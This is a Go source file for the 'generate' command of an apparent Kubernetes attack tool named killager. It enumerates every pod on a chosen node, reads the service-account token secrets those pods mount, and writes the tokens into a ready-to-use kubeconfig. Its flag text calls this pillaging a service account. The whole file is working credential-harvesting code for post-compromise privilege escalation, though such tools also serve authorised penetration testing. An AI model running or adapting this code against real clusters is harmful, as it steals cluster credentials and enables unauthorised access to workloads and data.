package main

import (
	"context"

	"github.com/4armed/killager/pkg/config"
	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
	clientcmdapi "k8s.io/client-go/tools/clientcmd/api"
)

var (
	clusterName = "default-cluster"
)

// Generate runs the generate command....
func Generate(c *config.Config) *cobra.Command {
	cmd := &cobra.Command{
		Use:              "generate",
		TraverseChildren: true,
		Short:            "Generate kubeconfig file with serviceAccount tokens found on node",
		RunE: func(cmd *cobra.Command, args []string) error {
			logrus.Infof("processing secrets on node %s", c.Node)

			// Parse the kubeconfig file specified
			kc, err := clientcmd.BuildConfigFromFlags("", c.KubeConfigFile)
			if err != nil {
				return err
			}

			// Create clientset
			clientset, err := kubernetes.NewForConfig(kc)
			if err != nil {
				return err
			}

			// Where we store the secrets
			// format: secretName = namespace
			secrets := make(map[string]string)

			// The beginnings of our output file
			kubeConfigData := clientcmdapi.Config{
				Clusters: map[string]*clientcmdapi.Cluster{clusterName: {
					Server:                   kc.Host,
					InsecureSkipTLSVerify:    kc.Insecure,
					CertificateAuthorityData: kc.CAData,
				}},
				AuthInfos:      map[string]*clientcmdapi.AuthInfo{},
				Contexts:       map[string]*clientcmdapi.Context{},
				CurrentContext: "",
			}

			// Loop through the pods and get the secret volume mounts
			pods, err := clientset.CoreV1().Pods("").List(context.TODO(), metav1.ListOptions{})
			if err != nil {
				return err
			}

			for _, pod := range pods.Items {
				// Skip if not our node
				if pod.Spec.NodeName != c.Node {
					continue
				}

				// Find the secret volumes
				for _, volume := range pod.Spec.Volumes {
					if volume.Secret != nil {
						secrets[volume.Secret.SecretName] = pod.GetNamespace()
					}
				}
			}

			for name, namespace := range secrets {
				secret, err := clientset.CoreV1().Secrets(namespace).Get(context.TODO(), name, metav1.GetOptions{})
				if err != nil {
					return err
				}

				if secret.Type == "kubernetes.io/service-account-token" {
					logrus.Debugf("secretName: %s/%s of type %s", namespace, name, secret.Type)
					if c.ServiceAccount != "" {
						if namespace != c.Namespace || secret.Annotations["kubernetes.io/service-account.name"] != c.ServiceAccount {
							// Skip if a specific serviceAccount is requested and this isn't it
							// This would be more efficient if we knew the secret name up front but
							// sometimes we don't.
							continue
						}
					}
					logrus.Infof("creating kubeconfig for serviceAccount %s/%s", namespace, secret.Annotations["kubernetes.io/service-account.name"])
					authInfoName := namespace + "-" + secret.Annotations["kubernetes.io/service-account.name"]

					// Add auth and context entries to kubeconfig for the identified serviceAccount
					kubeConfigData.AuthInfos[authInfoName] = &clientcmdapi.AuthInfo{
						Token: string(secret.Data["token"]),
					}
					kubeConfigData.Contexts[authInfoName] = &clientcmdapi.Context{
						Cluster:   clusterName,
						AuthInfo:  authInfoName,
						Namespace: namespace,
					}
				}

			}

			// Set the current context to the first context entry
			for context := range kubeConfigData.Contexts {
				kubeConfigData.CurrentContext = context
				break
			}

			// Marshal kubeConfigData to disk
			clientcmd.WriteToFile(kubeConfigData, c.KubeConfigOutputFile)

			return nil
		},
	}

	cmd.Flags().StringVarP(&c.KubeConfigFile, "kubeconfig", "k", "kubeconfig.yaml", "The kubeconfig file to read cluster config from")
	cmd.Flags().StringVarP(&c.KubeConfigOutputFile, "output-file", "o", "killager.yaml", "The kubeconfig file to write out to (will be overwritten)")
	cmd.Flags().StringVarP(&c.Namespace, "namespace", "n", "", "The namespace to read secrets from")
	cmd.Flags().StringVarP(&c.ServiceAccount, "service-account", "s", "", "The specific service-account to pillage, default is to get all")
	cmd.Flags().StringVar(&c.Node, "node", "", "Node to process secrets for")
	cmd.MarkFlagRequired("node")

	return cmd
}
